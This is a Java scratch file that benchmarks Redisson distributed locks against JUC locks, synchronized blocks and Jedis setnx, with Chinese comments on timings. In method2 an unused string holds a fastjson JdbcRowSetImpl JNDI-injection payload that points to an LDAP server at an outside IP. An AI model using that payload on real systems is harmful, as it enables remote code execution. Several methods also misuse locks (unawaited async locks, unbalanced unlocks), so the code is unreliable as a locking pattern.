package com.jfy.common.redisson.module.utils;


import com.google.common.base.Stopwatch;
import org.redisson.Redisson;
import org.redisson.api.RLock;
import org.redisson.api.RedissonClient;
import org.redisson.config.Config;
import org.redisson.config.SingleServerConfig;
import redis.clients.jedis.Jedis;

import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.locks.ReentrantLock;
import java.util.function.Consumer;


/**
 * @Description: redisson锁性能比较：总结：  redisson分布式锁性能相对juc和synchronized锁较低，由于redisson对分布式锁封装较好，对各种异常情况进行了处理，健壮性很高，但是性能损失较大
 * @Author: jiahuiyang
 * @Date: Created in 13:56 2021/3/24
 */
public class Performance {
    public static int num;

    public static void main(String[] args) throws Exception {

//        pressure(10, 1000000, v -> {
//            int n = 0;
//            for (int i = 0; i < 10000000; i++) {
//                n += i;
//            }
//        }, null);


//        redissonTest();

//        method();

//        method1();

//        method2();

        method3();

    }

    public static void method3() {
        RedissonClient client = Redisson.create();

        final int count = 100000;

        Stopwatch stopwatch = Stopwatch.createStarted();
        for (int i = 0; i < count; i++) {

            RLock lock = client.getLock("lock");

            lock.lock();

            System.out.println();

            lock.unlock();
        }
        stopwatch.stop();
        System.out.println(stopwatch.elapsed());

    }

    public static void method2() {

        String json = "{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://106.15.250.145:9999/Object\",\"autoCommit\":true},\"wid\":1501318639}";

        RedissonClient client = Redisson.create();
        RLock lock = client.getLock("");

        lock.lockAsync();
    }

    /**
     * 异步锁竞争
     */
    public static void method1() {
        RedissonClient client = Redisson.create();

        RLock lock = client.getLock("lock");

        new Thread(()->{
            lock.lock();
            try {
                TimeUnit.SECONDS.sleep(1000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }

        }).start();


        if (lock.tryLock()) {

            System.out.println();
        }

        lock.unlock();

        System.out.println();




    }

    public static void method() {

        Jedis jedis = new Jedis("127.0.0.1", 6379);



        Config config = new Config();
//        config.setThreads(0);
        SingleServerConfig singleServerConfig = config.useSingleServer();

        singleServerConfig.setAddress("redis://127.0.0.1:6379");
//        singleServerConfig.setConnectionMinimumIdleSize(200);
//        singleServerConfig.setConnectionPoolSize(200);
        singleServerConfig.setDatabase(0);



        RLock lock = Redisson.create(config).getLock("mmk");

        Stopwatch stopwatch = Stopwatch.createStarted();

        for (int i = 0; i < 10000; i++) {
            lock.lock();
            lock.lockAsync();
            while (jedis.setnx("jjj", "1") <= 0) {

            }
            ;

            jedis.del("jjj");
            lock.unlockAsync();
            lock.lock();
        }
        stopwatch.stop();

        System.out.println(stopwatch.elapsed(TimeUnit.MILLISECONDS));


    }


    public static void pressure(int threadNum, int singleExecuteNum, Consumer<Object[]> consumer, Object... params) throws InterruptedException {
        CountDownLatch startLatch = new CountDownLatch(1);
        CountDownLatch endLatch = new CountDownLatch(threadNum);
        Stopwatch stopwatch = Stopwatch.createStarted();
        for (int i = 0; i < threadNum; i++) {
            new Thread(() -> {
                for (int j = 0; j < singleExecuteNum; j++) {

                    try {
                        startLatch.await();
                        consumer.accept(params);
                        endLatch.countDown();
                    } catch (Exception e) {
                        e.printStackTrace();
                    }

                }
            }).start();
        }

        System.out.println("=================all threads start execute===================");
        startLatch.countDown();


        endLatch.await();
        stopwatch.stop();
        System.out.println("=================all threads end execute===================");


        System.out.println("all threads execute consume time: " + stopwatch.elapsed(TimeUnit.MILLISECONDS) + "ms");

    }


    public static void redissonTest() throws Exception {
//        Redisson.create(Config.fromYAML());

        Config config = new Config();
//        config.setTransportMode(TransportMode.EPOLL);
        config.useSingleServer()
                .setTimeout(10000)
                .setAddress("redis://127.0.0.1:6379");
//                .setConnectionPoolSize(1000)
//                .setConnectionMinimumIdleSize(1000);


        RLock rLock = Redisson.create(config).getLock("lock");

        CountDownLatch startLatch = new CountDownLatch(1);
        CountDownLatch endLatch = new CountDownLatch(10);


        Stopwatch watch = Stopwatch.createStarted();

        ReentrantLock lock = new ReentrantLock();

        for (int i = 0; i < 10; i++) {
            new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        startLatch.await();
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }

                    //rLock锁粒度大的情况下耗时毫秒级百毫秒
//                    rLock.lock(1, TimeUnit.SECONDS);


                    //juc lock 锁粒度大 1毫秒
//                    lock.lock();

//                    rLock tryLock耗时和lock一致
//                    try {
//                        rLock.tryLock(1,1,TimeUnit.SECONDS);
//                    } catch (InterruptedException e) {
//                        e.printStackTrace();
//                    }
                    for (int j = 0; j < 1000; j++) {
                        //rLock锁粒度小的情况下耗时10s   优化：可以扩大锁粒度还有锁分段执行
                        rLock.lockAsync(1, TimeUnit.SECONDS);

                        //juc lock锁粒度小的情况下耗时5ms  说明同样级别下juc锁的耗时比较指数级缩小  而且redis分布式在并发量高的情况下极高
//                        lock.lock();

                        //重入锁 性能5毫秒
//                        synchronized (Performance.class) {

                        int n = Performance.num;
                        n = n + 1;
                        Performance.num = n;
//                        }

//                        lock.unlock();
                        rLock.unlockAsync();
                    }
//                    rLock.unlock();

//                    lock.unlock();

//                    rLock.unlock();
                    endLatch.countDown();
                }
            }).start();
        }

        startLatch.countDown();

        endLatch.await();

        watch.stop();
        System.out.println(watch.elapsed(TimeUnit.MILLISECONDS));
        TimeUnit.SECONDS.sleep(40);


        System.out.println(Performance.num);
    }
}
